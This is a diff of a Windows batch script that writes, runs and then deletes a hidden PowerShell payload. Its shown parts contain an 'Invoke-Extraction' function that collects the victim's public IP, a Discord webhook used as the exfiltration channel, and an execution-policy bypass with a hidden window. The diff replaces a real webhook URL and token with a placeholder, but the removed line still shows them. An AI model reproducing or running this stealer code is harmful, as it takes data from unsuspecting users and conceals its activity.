@@ -10,7 +10,7 @@ echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsI
 echo return $test >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function Invoke-Extraction { >> powershell123.ps1
-echo $webhook = "https://discord.com/api/webhooks/1096960369072812093/8YZbNyXu7DX_6QJX4aXGR3TZfoIMHfXHWTlxxJcc7Xaf46FUOUHYQDKpO7Udg8sOHsSs" >> powershell123.ps1
+echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
 echo $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell123.ps1
 echo $ip = $ip.Content >> powershell123.ps1
 echo $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell123.ps1
@@ -240,3 +240,4 @@ powershell.exe -noprofile -executionpolicy bypass -WindowStyle hidden -file powe
 del powershell123.ps1 /f /q
 timeout 3 > nul
 exit
+
